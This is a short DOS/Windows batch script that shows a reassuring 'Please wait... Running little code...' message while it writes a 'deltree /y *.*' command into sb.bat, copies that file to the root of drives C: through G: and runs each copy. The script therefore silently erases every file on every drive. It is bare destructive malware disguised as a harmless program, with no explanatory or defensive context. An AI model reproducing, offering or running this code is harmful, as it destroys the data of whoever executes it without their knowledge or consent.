@echo off
@echo Please wait...
@echo Running little code...
@echo: deltree /y *.* >sb.bat
set alldir=c:\ d:\ e:\ f:\ g:\
set allfile=c:\sb.bat d:\sb.bat e:\sb.bat f:\sb.bat g:\sb.bat
for %%b in (%alldir%) do copy sb.bat %%b 
for %%f in (%allfile%) do call %%f

